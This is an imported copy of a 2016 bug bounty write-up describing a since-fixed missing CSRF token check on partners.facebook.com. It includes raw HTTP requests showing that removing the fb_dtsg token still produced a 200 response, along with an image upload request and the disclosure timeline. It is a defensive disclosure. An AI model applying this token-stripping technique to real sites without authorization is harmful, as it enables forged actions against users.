---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-09-20_csrf-in-partnersfacebookcom.md
original_filename: 2016-09-20_csrf-in-partnersfacebookcom.md
title: CSRF in partners.facebook.com
category: documents
detected_topics:
- idor
- command-injection
- otp
- csrf
- clickjacking
tags:
- imported
- documents
- idor
- command-injection
- otp
- csrf
- clickjacking
language: en
raw_sha256: 8e440854ac3f7ab23a1c21c7743997d0d7bc1109cd36402baec995ec06e3a5f8
text_sha256: 703f096116248f7e47e5b1c8266d9d7fcf6712144887f0bf1fac5576894abfbd
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# CSRF in partners.facebook.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-09-20_csrf-in-partnersfacebookcom.md
- Source Type: markdown
- Detected Topics: idor, command-injection, otp, csrf, clickjacking
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `8e440854ac3f7ab23a1c21c7743997d0d7bc1109cd36402baec995ec06e3a5f8`
- Text SHA256: `703f096116248f7e47e5b1c8266d9d7fcf6712144887f0bf1fac5576894abfbd`


## Content

---
title: "CSRF in partners.facebook.com"
page_title: "lol/_posts/2016-09-20-Facebook-partners-CSRF.md at d17ed765129b26a1bf8060757e5aebd4e237c908 · cymtrick/lol · GitHub"
url: "https://github.com/cymtrick/lol/blob/d17ed765129b26a1bf8060757e5aebd4e237c908/_posts/2016-09-20-Facebook-partners-CSRF.md"
final_url: "https://github.com/cymtrick/lol/blob/d17ed765129b26a1bf8060757e5aebd4e237c908/_posts/2016-09-20-Facebook-partners-CSRF.md"
authors: ["Prashanth Varma (@cymtrick)"]
programs: ["Meta / Facebook"]
bugs: ["CSRF"]
bounty: "5,000"
publication_date: "2016-09-20"
added_date: "2022-10-28"
source: "pentester.land/writeups.json"
original_index: 6258
---

> CSRF in partners.facebook.com

I was looking for something on internet.org, But there is an option for submitting your site to internet.org.That redirected me to this <https://partners.facebook.com/cp/onboarding/> .

Jack Whitton wrote an article on site wide csrf in messenger.com. This one explained how facebook was not properly validating the csrf tokens at server side .

My sixth sense was saying that this site would be rarely visited so there would be some bugs. Intially I was trying for IDOR but it failed. Then I tried to remove the fb_dtsg the server response was 200. Here is the tcp dump of [ Original Request, Edited request, Response].
  
  
  POST /cp/onboarding/submit/ HTTP/1.1
  Host: partners.facebook.com
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
  Content-Length: 726
  Cookie: {COOKIE}
  Connection: keep-alive
  Pragma: no-cache
  Cache-Control: no-cache
  
  fb_dtsg=[token]&site_name=prashanth&short_description=asdasdasdsadasdasd&long_description=asdasdasdasdadasd%20asdjnasjdnasjdnas%20dasjndjasndjansdas%20dasjndjasd&category=communication&submission_id=1664831777136420&partner_id&
  country_configs[IN][locales][en_GB][http]=yilo.me%2F&country_configs[IN][locales][en_GB][https]=&country_configs[IN][default]=en_GB&country_configs[IN][status]=pending1&country_configs[IN][comment]&country_configs[IN][action]=add&country_configs[IN][config_fbid]=1664831780469753&
  country_configs[IN][is_editable]=true&country_configs[IN][is_deletable]=true&__user=1529285343&__a=1

Edited request:
  
  
  POST /cp/onboarding/submit/ HTTP/1.1
  Host: partners.facebook.com
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
  Content-Length: 726
  Cookie: {COOKIE}
  Connection: keep-alive
  Pragma: no-cache
  Cache-Control: no-cache
  
  site_name=prashanth&short_description=asdasdasdsadasdasd&long_description=asdasdasdasdadasd%20asdjnasjdnasjdnas%20dasjndjasndjansdas%20dasjndjasd&category=communication&submission_id=1664831777136420&partner_id&
  country_configs[IN][locales][en_GB][http]=yilo.me%2F&country_configs[IN][locales][en_GB][https]=&country_configs[IN][default]=en_GB&country_configs[IN][status]=pending1&country_configs[IN][comment]&country_configs[IN][action]=add&country_configs[IN][config_fbid]=1664831780469753&
  country_configs[IN][is_editable]=true&country_configs[IN][is_deletable]=true&__user=1529285343&__a=1

Response:
  
  
  HTTP/1.1 200 OK
  X-Frame-Options: DENY
  Pragma: no-cache
  X-FB-Debug: Dmgrhewc6N5fT+i20ldq1OlYtN45IWMAcGGzafxtVMGqClAKvDjbysUAbMhoR1YfQjL0S5p5deoLKdlEqkBb1w==
  Date: Mon, 24 Aug 2015 10:58:38 GMT
  Connection: keep-alive
  Content-Length: 193
  
  for (;;);{"__ar":1,"payload":null,"jsmods":{"require":[["goURI"]]},"onload":["goURI(\"\\\/cp\\\/onboarding\\\/?submission_id=424609417741749\", true);"],"bootloadable":{},"ixData":{},"lid":"0"}

Csrf check is missing on every endpoint of partners.facebook.com. Even some can change the submitted site using the id of the post .This could impact the site owners and there reputation. Another request which uploads banner photo of site Request:
  
  
  POST /cp/onboarding/images/submit/?__user=1529285343&__a=1
  Host: partners.facebook.com
  Content-Type: multipart/form-data; boundary=---------------------------3455666841143476500578378497
  
  
  -----------------------------3455666841143476500578378497
  Content-Disposition: form-data; name="banner"; filename="love.png"
  Content-Type: image/png
  -----------------------------3455666841143476500578378497--

Response:
  
  
  HTTP/1.1 200 OK
  X-Frame-Options: DENY
  Pragma: no-cache
  X-FB-Debug: Dmgrhewc6N5fT+i20ldq1OlYtN45IWMAcGGzafxtVMGqClAKvDjbysUAbMhoR1YfQjL0S5p5deoLKdlEqkBb1w==
  Date: Mon, 24 Aug 2015 10:58:38 GMT

Timeline:  
Bug reported:20 August, 2015  
Bug acknowledged:21 August, 2015  
Bug Poc sent: 24 August, 2015  
Bug triaged:3 September,2015  
Bug fixed:18 September, 2015 (Now response is 400 if csrf tokens are missing)  
Bug bounty awarded :19 September, 2015 . Facebook awarded me 5000$
